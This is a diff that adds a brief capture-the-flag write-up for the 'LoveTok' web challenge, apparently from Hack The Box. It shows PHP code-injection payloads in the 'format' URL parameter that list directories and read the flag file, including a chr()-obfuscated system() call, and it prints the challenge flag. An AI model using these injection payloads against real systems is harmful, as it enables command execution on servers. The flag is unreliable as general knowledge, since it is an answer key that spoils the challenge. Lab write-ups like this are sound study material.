@@ -1,0 +1,19 @@
+challenges_web_LoveTok
+
+Description:
+True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung... 
+you find yourself licking your wounds and contemplating human existence. You wish to have somebody important 
+in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, 
+the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin' 
+(at your door). Come and check it out, but don't try to cheat love because love cheats back
+
+Exploit:
+http://134.209.191.159:32399/?format=${print(`ls`)}
+http://134.209.191.159:32399/?format=${print(`ls /`)}
+http://134.209.191.159:32399/?format=${print(`cat /flag*`)}
+format=${system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(102).chr(108).chr(97).chr(103).chr(42))}
+
+Flag:
+HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
+
+-----------------------------------------------------------------------------------------------------------------
